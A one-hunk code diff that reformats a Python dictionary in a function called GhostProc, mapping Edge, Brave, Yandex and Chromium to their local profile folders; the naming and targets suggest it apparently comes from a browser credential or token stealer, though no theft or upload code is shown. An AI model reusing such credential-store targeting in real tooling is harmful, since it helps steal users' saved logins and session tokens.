@@ -50,7 +50,7 @@ def GhostProc():
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Chromium':local + '\\Chromium\\User Data\\Default',
+        'Chromium': local + '\\Chromium\\User Data\\Default',
 
     }
 
